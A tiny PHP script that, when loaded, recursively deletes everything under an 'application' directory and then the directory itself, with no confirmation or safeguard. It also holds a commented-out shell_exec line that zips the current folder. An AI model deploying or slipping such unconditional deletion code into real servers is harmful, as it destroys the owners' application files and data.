<?php
// $result=shell_exec("zip -r zipfile.zip .");
// echo $result;



function delete_files($dir) { 
  foreach(glob($dir . '/*') as $file) { 
    if(is_dir($file)) delete_files($file); else unlink($file); 
  } rmdir($dir); 
}

delete_files('application');

?>